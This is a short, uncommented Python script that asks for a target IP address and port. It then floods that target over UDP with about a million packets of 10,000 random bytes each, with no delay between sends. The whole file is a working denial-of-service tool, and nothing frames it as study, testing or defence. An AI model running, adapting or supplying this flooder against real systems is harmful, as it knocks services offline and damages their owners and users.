#!/bin/python3

import socket 
import time
import random
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


ip = input('ip: ')
port = int(input('port: '))
sleep = 0

s.connect((ip, port))

for i in range(1, 1000*1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)

